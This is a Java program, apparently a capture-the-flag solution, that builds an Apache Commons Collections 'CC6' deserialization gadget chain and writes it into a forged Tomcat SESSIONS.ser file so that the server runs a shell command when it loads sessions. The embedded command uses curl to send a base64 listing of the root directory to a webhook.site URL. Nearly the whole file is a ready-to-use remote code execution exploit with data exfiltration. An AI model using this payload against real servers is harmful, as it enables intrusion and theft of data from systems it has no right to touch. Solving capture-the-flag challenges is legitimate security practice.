package com.ctf.challenge;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

/**
 * Generates a SESSIONS.ser file in the exact format expected by Tomcat's
 * StandardManager.doLoad() / StandardSession.doReadObject().
 *
 * Format written:
 * Integer(1) -- session count
 * -- doReadObject per session --
 * Long creationTime
 * Long lastAccessedTime
 * Integer maxInactiveInterval
 * Boolean isNew
 * Boolean isValid
 * Long thisAccessedTime
 * String sessionId
 * -- attributes loop (ends when Integer sentinel is read) --
 * String attrName -- "x" (any name)
 * Object attrValue <-- CC6 gadget HashSet here
 * Integer 0 -- sentinel: end of attributes
 */
public class CC6Generator {

    public static void main(String[] args) throws Exception {
        String command =
            "curl https://webhook.site/70a5db6f-6e69-4c3b-8d32-4cb9375114a0/$(ls / | base64 | tr -d \"\\n\")";

        // 1. Build the CC6 transformer chain (armed later to avoid local trigger)
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer(
                "getMethod",
                new Class[] { String.class, Class[].class },
                new Object[] { "getRuntime", new Class[0] }
            ),
            new InvokerTransformer(
                "invoke",
                new Class[] { Object.class, Object[].class },
                new Object[] { null, new Object[0] }
            ),
            new InvokerTransformer(
                "exec",
                new Class[] { String[].class },
                new Object[] { new String[] { "/bin/bash", "-c", command } }
            ),
        };

        // Placeholder chain (safe, no trigger during construction)
        Transformer transformerChain = new ChainedTransformer(
            new Transformer[] { new ConstantTransformer(1) }
        );

        // 2. Setup LazyMap backed by the placeholder chain
        Map<Object, Object> innerMap = new HashMap<>();
        Map<Object, Object> lazyMap = LazyMap.decorate(
            innerMap,
            transformerChain
        );

        // 3. TiedMapEntry will call lazyMap.get("foo") on hashCode()
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        // 4. HashSet whose internal key is replaced with the TiedMapEntry
        HashSet<Object> set = new HashSet<>(1);
        set.add("foo"); // temporary placeholder so the map has a node

        Field fSet = HashSet.class.getDeclaredField("map");
        fSet.setAccessible(true);
        HashMap<?, ?> internalMap = (HashMap<?, ?>) fSet.get(set);

        Field fTable = HashMap.class.getDeclaredField("table");
        fTable.setAccessible(true);
        Object[] table = (Object[]) fTable.get(internalMap);

        Object node = null;
        for (Object obj : table) {
            if (obj != null) {
                node = obj;
                break;
            }
        }
        if (node == null) throw new IllegalStateException(
            "HashMap table node not found"
        );

        Field fKey = node.getClass().getDeclaredField("key");
        fKey.setAccessible(true);
        fKey.set(node, entry);

        // Remove cached entry so LazyMap is clean before arming
        lazyMap.remove("foo");

        // 5. Arm the real transformer chain via reflection (avoids local trigger)
        Field fChain = ChainedTransformer.class.getDeclaredField(
            "iTransformers"
        );
        fChain.setAccessible(true);
        fChain.set(transformerChain, transformers);

        // 6. Serialize in the exact Tomcat StandardManager SESSIONS.ser format
        System.out.println(
            "[*] Writing CC6 payload to /tmp/SESSIONS.ser (Tomcat format)..."
        );
        try (
            ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("/tmp/SESSIONS.ser")
            )
        ) {
            // --- StandardManager.doLoad() expects Integer(count) first ---
            oos.writeObject(Integer.valueOf(1));

            // --- StandardSession.doReadObject() field order ---
            long now = System.currentTimeMillis();
            oos.writeObject(Long.valueOf(now)); // creationTime
            oos.writeObject(Long.valueOf(now)); // lastAccessedTime
            oos.writeObject(Integer.valueOf(1800)); // maxInactiveInterval (30 min)
            oos.writeObject(Boolean.FALSE); // isNew
            oos.writeObject(Boolean.TRUE); // isValid
            oos.writeObject(Long.valueOf(now)); // thisAccessedTime
            oos.writeObject("deadbeef"); // session id (arbitrary)

            // --- Attribute loop ---
            // Tomcat reads: if obj instanceof Integer → end-of-attrs, else treat as String
            // name
            oos.writeObject("pwn"); // attribute name (String)
            oos.writeObject(set); // attribute value = CC6 gadget
            oos.writeObject(Integer.valueOf(0)); // sentinel: end of attributes
        }
        System.out.println("[+] Done! /tmp/SESSIONS.ser ready.");
    }
}
